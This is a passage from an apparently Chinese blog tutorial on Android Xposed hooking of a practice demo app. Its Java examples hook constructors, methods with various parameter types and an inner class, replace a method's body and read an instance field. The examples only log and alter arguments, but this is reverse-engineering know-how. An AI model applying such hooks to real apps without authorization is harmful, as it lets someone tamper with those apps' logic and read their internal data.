class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//XposedBridge.log(TAG+&quot;|&quot;+&quot;我抓到你了:&quot;+loadPackageParam.packageName);</span></span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        <span class="comment">//XposedHelpers.setStaticIntField(clazz,&quot;staticInt&quot;,1000);</span></span><br><span class="line">        <span class="comment">//XposedHelpers.setStaticObjectField(clazz,&quot;Tag&quot;,&quot;zxk1ng&quot;);</span></span><br><span class="line">        XposedHelpers.findAndHookConstructor(clazz, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;这是无参构造函数前&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;这是无参构造函数后&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        XposedHelpers.findAndHookConstructor(clazz, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                param.args[<span class="number">0</span>]=<span class="string">&quot;xposed专题&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;这是有参构造函数后&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>XposedHelpers.findAndHookConstructor(Class&lt;?&gt; clazz, Object… parameterTypesAndCallback)：hook构造方法，参数为clazz, new XC_MethodHook()，clazz为加载的类。这个hook构造方法的参数可以加xxx.class，指定hook方法的参数列表，xxx为构造函数中对应的参数类型。（参考如上图片解析）</li><li>XposedHelpers.findAndHookConstructor(‘类’，‘参数列表’，new XC_MethodHook())</li><li>XC_MethodHook()方法输入后会跳出个弹窗，选中这两个。<img src="assets/image-20230714181900369.png" alt="image-20230714181900369"></li></ul><p>然后在生成的beforeHookedMethod()，afterHookedMethod()方法内写逻辑就好</p><ul><li>param.args[0]：param是一个数组，param.args[0]指定参数的第一个数据。</li></ul><h3 id="执行结果-2">执行结果</h3><ul><li>运行demo<br><img src="assets/image-20230714182217127.png" alt="image-20230714182217127"></li></ul><h2 id="三-Hook普通-静态方法">三.Hook普通/静态方法</h2><h3 id="目标：hook掉demo的普通方法image-20230714184958696">目标：hook掉demo的普通方法<img src="assets/image-20230714184958696.png" alt="image-20230714184958696"></h3><h3 id="代码实现如下-3">代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;publicFunc&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;publicFunc is hooked before&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;publicFunc is hooked after&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>XposedHelpers.findAndHookMethod(Class&lt;?&gt; clazz, String methodName, Object… parameterTypesAndCallback):hook普通方法，静态方法，具体使用方法和hook构造方法差不多。</li></ul><p>​XposedHelpers.findAndHookMethod(‘类’，方法名，‘参数列表’，new XC_MethodHook())</p><h3 id="执行结果-3">执行结果</h3><p>运行demo<img src="assets/image-20230714185618441.png" alt="image-20230714185618441"></p><h2 id="四-Hook复杂参数">四.Hook复杂参数</h2><h3 id="目标：hook掉demo有多个参数的方法">目标：hook掉demo有多个参数的方法</h3><p><img src="assets/image-20230714212338332.png" alt="image-20230714212338332"></p><h3 id="代码实现如下-4">代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;complexParameterFunc&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.String&quot;</span>,<span class="comment">//String.class</span></span><br><span class="line">                <span class="string">&quot;[[Ljava.lang.String;&quot;</span>, <span class="comment">//String[][].class</span></span><br><span class="line">                <span class="string">&quot;java.util.Map&quot;</span>,</span><br><span class="line">                Class.forName(<span class="string">&quot;java.util.ArrayList&quot;</span>), <span class="comment">//&quot;java.util.ArrayList&quot;</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;complexParameterFunc is hooked before&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;complexParameterFunc is hooked after&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和上面hook普通方法一样，就是参数多了一些以及拓展了参数列表的表达方式：</p><ul><li>“java.lang.String”(String类路径)&quot;&lt;==&gt;String.class</li><li>“[[Ljava.lang.String;”(String二维数组的smali形式)</li><li>Class.forName(“java.util.Map”)“java.util.Map”(Map包路径)&lt;==&gt;Map.class</li><li>Class.forName(“java.util.ArrayList”)&lt;==&gt;“java.util.ArrayList”&lt;==&gt;ArrayList.class</li></ul><h3 id="执行结果-4">执行结果</h3><p>运行demo<br><img src="assets/image-20230714220025533.png" alt="image-20230714220025533"></p><h2 id="五-Hook自定义类参数">五.Hook自定义类参数</h2><h3 id="目标：hook掉demo中的自定义类参数的方法">目标：hook掉demo中的自定义类参数的方法</h3><p><img src="assets/image-20230715165947513.png" alt="image-20230715165947513"></p><h3 id="代码实现如下-5">代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        <span class="comment">//方法一</span></span><br><span class="line">        Class aniclazz=loadPackageParam.classLoader.loadClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Animal&quot;</span>);</span><br><span class="line">        <span class="comment">//方法二</span></span><br><span class="line">        <span class="comment">//Class aniclazz=XposedHelpers.findClass(&quot;com.xiaojianbang.xposeddemo.Animal&quot;,loadPackageParam.classLoader);</span></span><br><span class="line">        <span class="comment">//方法三</span></span><br><span class="line">        <span class="comment">//Class aniclazz=Class.forName(&quot;com.xiaojianbang.xposeddemo.Animal&quot;,false,loadPackageParam.classLoader)</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;Inner&quot;</span>,</span><br><span class="line">                aniclazz,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;这是自定义类参数的hook&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和前面也大差不差，主要就是多了一个自已定义的类，不能使用xxx.class方法了，这里使用先加载类，这里有三个方法：</p><ul><li>loadPackageParam.classLoader.loadClass(包+类名)：加载类</li><li>XposedHelpers.findClass(“包+类”,loadPackageParam.classLoader);</li><li>Class.forName(“包+类”,false,loadPackageParam.classLoader)</li></ul><h3 id="执行结果-5">执行结果</h3><p>运行demo</p><p><img src="assets/image-20230715172838293.png" alt="image-20230715172838293"></p><h2 id="六-Hook替换函数">六.Hook替换函数</h2><h3 id="目标：hook掉一个方法的输出内容">目标：hook掉一个方法的输出内容</h3><p><img src="assets/image-20230715181604016.png" alt="image-20230715181604016"></p><h3 id="代码实现如下-6">代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line"></span><br><span class="line">        XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;repleaceFunc&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;xiaojianbang&quot;</span>,<span class="string">&quot;这是替换之后的输出&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>new XC_MethodReplacement():用来hook修改方法</li></ul><h3 id="执行结果-6">执行结果</h3><p>运行demo，发现没有输出’this is repleaceFunc log’，hook成功<br><img src="assets/image-20230715181924016.png" alt="image-20230715181924016"></p><h2 id="七-Hook内部类">七.Hook内部类</h2><h3 id="目标：hook内部类，得到内部类中的实例对象">目标：hook内部类，得到内部类中的实例对象</h3><p><img src="assets/image-20230715191405906.png" alt="image-20230715191405906"></p><h3 id="代码实现如下-7">代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="type">int</span> aa=XposedHelpers.getIntField(param.thisObject,<span class="string">&quot;innerPublicInt&quot;</span>);</span><br><span class="line">                        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;&quot;</span>+aa);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体还是使用XposedHelpers.findAndHookMethod()方法，但是参数变化了，因为现在是Demo$InnerClass类不再是原来的Demo类。</p><p>使用XposedHelpers.findClass方法加载类Demo$InnerClass</p><ul><li>XposedHelpers.getIntField(Object obj, String fieldName)：得到int型字段</li><li>param.thisObject：我们通过调用param对象的thisObject属性获取当前方法所属的类的实例</li></ul><h3 id="执行结果-7">执行结果</h3><p>运行demo<br><img src="assets/image-20230715195241921.png" alt="image-20230715195241921"></p><h2 id="八-主动调用">八.主动调用</h2><h3 id="目标：hook主动调用image-20230715213038516">目标：hook主动调用<img src="assets/image-20230715213038516.png" alt="image-20230715213038516"></h3><h3 id="代码实现如下-8">代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 